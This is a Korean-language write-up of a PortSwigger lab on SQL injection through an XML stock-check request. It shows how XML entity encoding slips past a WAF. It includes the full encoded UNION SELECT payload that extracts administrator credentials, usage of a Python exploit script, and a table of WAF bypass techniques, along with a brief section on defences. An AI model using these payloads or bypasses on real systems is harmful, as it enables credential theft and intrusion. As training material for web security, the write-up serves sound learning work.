# Lab: SQL injection with filter bypass via XML encoding

## 개요

- **난이도**: Practitioner
- **주제**: SQL Injection — WAF Filter Bypass / XML Encoding
- **링크**: https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding
- **참고**: https://portswigger.net/web-security/sql-injection/cheat-sheet

## 목표

재고 조회 기능의 XML 파라미터에 SQL 인젝션을 삽입하여 `users` 테이블에서 `administrator` 계정의 비밀번호를 추출하고 해당 계정으로 로그인한다.

## 취약점 위치

`POST /product/stock` 엔드포인트의 XML 바디 내 `<storeId>` 필드.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>2</productId>
  <storeId>1</storeId>   <!-- 여기에 SQL 삽입 -->
</stockCheck>
```

## WAF 탐지 및 우회

### 1단계 — 평문 UNION SELECT: WAF 차단 확인

`storeId`에 UNION SELECT를 그대로 삽입하면 WAF가 탐지하여 HTTP 403을 반환한다.

```
storeId: 1 UNION SELECT NULL--
→ HTTP 403 Forbidden ("Attack detected")
```

### 2단계 — XML 엔티티 인코딩으로 우회

SQL 키워드를 XML 엔티티(Decimal `&#N;` 또는 Hex `&#xN;`)로 인코딩하면 WAF를 통과한다.

WAF는 XML 엔티티 형태의 문자열을 SQL 패턴으로 인식하지 못하지만, DB 앞단의 XML 파서가 엔티티를 디코딩한 후 SQL을 실행하므로 공격이 성립한다.

```
평문: UNION SELECT
Decimal 인코딩: &#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;
Hex 인코딩:     &#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x63;&#x74;
```

### 3단계 — 계정 정보 추출

`||` 연결 연산자로 username과 password를 합쳐 단일 컬럼으로 반환한다.  
(`storeId`가 단일 정수값을 기대하는 컬럼이므로 UNION SELECT도 단일 컬럼으로 구성)

```sql
0 UNION SELECT username || '~' || password FROM users
```

`0`을 앞에 두면 원래 쿼리 결과(재고 수량)는 반환되지 않고 UNION 결과만 응답에 포함된다.

인코딩 후 전송하는 XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>2</productId>
  <storeId>&#48;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#32;&#124;&#124;&#32;&#39;&#126;&#39;&#32;&#124;&#124;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;</storeId>
</stockCheck>
```

응답에 `administrator~[password]` 형태로 계정 정보가 포함된다.

## 실습 절차

1. Burp Suite로 `/product/stock` 요청을 인터셉트하여 XML 바디 구조 확인
2. `storeId`에 `1 UNION SELECT NULL--` 삽입 → HTTP 403으로 WAF 존재 확인
3. Python 툴 또는 Hackvertor(Burp 확장) 로 페이로드를 XML 엔티티 인코딩
4. 인코딩된 페이로드를 `storeId`에 삽입하여 전송 → HTTP 200 + 계정 정보 응답 확인
5. 추출한 비밀번호로 `administrator` 계정 로그인 → 랩 완료

## Python 툴 사용법

```bash
python3 tools/01-sqli-018-xml-filter-bypass.py https://[랩ID].web-security-academy.net

# 응답 본문 전체 확인 (파싱 실패 시 디버깅)
python3 tools/01-sqli-018-xml-filter-bypass.py https://[랩ID].web-security-academy.net --debug

# Hex 인코딩만 사용
python3 tools/01-sqli-018-xml-filter-bypass.py https://[랩ID].web-security-academy.net --encode hex
```

## 핵심 정리

- WAF는 요청 바디에서 `UNION`, `SELECT` 등의 SQL 키워드를 평문으로 탐지한다.
- XML 파서는 엔티티(`&#N;`, `&#xN;`)를 원래 문자로 디코딩한 후 값을 전달하므로, DB에는 정상적인 SQL이 도달한다.
- WAF는 인코딩된 형태를 SQL 패턴으로 인식하지 못해 통과시킨다 — 인코딩 레이어가 WAF를 속이는 핵심이다.
- UNION SELECT의 컬럼 수는 원래 쿼리(storeId = 단일 정수)와 일치해야 한다.
- **방어**: WAF에서 XML 엔티티 디코딩 후 패턴 매칭, Prepared Statement 사용, 입력값 화이트리스트 검증.

## 배운 점 및 추가 학습

### 1. 인코딩 레이어를 활용한 WAF 우회

WAF 우회의 핵심은 탐지 레이어와 실행 레이어 사이에 **인코딩 변환**을 끼워넣는 것이다.

```
[공격자] → 인코딩된 페이로드 → [WAF: 탐지 실패] → [XML 파서: 디코딩] → [DB: SQL 실행]
```

XML 엔티티 외에도 URL 인코딩(`%55%4e%49%4f%4e`), Base64, 이중 인코딩 등 WAF가 처리하지 않는 인코딩 레이어를 찾으면 동일한 우회가 가능하다.

### 2. 다른 WAF 우회 기법들

| 기법 | 예시 | 원리 |
|------|------|------|
| XML 엔티티 인코딩 | `&#83;&#69;&#76;&#69;&#67;&#84;` | XML 파서 디코딩 이용 |
| URL 이중 인코딩 | `%2553%454c%4543%5400` | URL 디코딩 두 번 통과 |
| 주석 삽입 | `UN/**/ION SEL/**/ECT` | 주석이 SQL 파서에서 제거됨 |
| 대소문자 혼용 | `UnIoN SeLeCt` | 단순 문자열 매칭 WAF 우회 |
| 공백 대체 | `UNION%09SELECT` (탭), `UNION%0aSELECT` (개행) | 공백 필터 우회 |

### 3. Hackvertor — Burp Suite 확장 도구

수동 테스트 시 Hackvertor 확장을 Burp Suite에 설치하면 GUI에서 클릭 한 번으로 다양한 인코딩을 적용할 수 있다.

```
Burp Suite → Extender → BApp Store → "Hackvertor" 설치
요청 본문 선택 → 우클릭 → Extensions → Hackvertor → dec_entities
```

### 4. XML 기반 API에서의 SQLi 특이점

일반 URL 파라미터 SQLi와 달리 XML 기반 엔드포인트는:

- 입력값이 XML 파서를 거쳐 DB에 전달됨 → XML 엔티티 인코딩이 자연스럽게 우회 수단이 됨
- `Content-Type: application/xml` 헤더가 필수
- XML 문법 오류(`<` 등 이스케이프 필요 문자)가 있으면 파서에서 먼저 에러 발생
- GraphQL, SOAP 등 XML/JSON 기반 API에서도 동일한 인코딩 우회 패턴이 적용 가능
